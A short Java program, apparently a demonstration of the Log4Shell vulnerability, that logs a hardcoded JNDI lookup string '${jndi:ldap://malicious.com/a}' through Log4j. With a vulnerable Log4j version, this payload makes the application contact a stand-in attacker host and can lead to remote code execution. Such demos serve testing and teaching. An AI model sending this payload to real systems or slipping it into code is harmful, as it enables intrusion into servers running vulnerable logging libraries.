package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class App {

    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main(String[] args) {
        String userInput = "${jndi:ldap://malicious.com/a}";

        logger.info("User input: " + userInput);

        System.out.println("Application running...");
    }
}
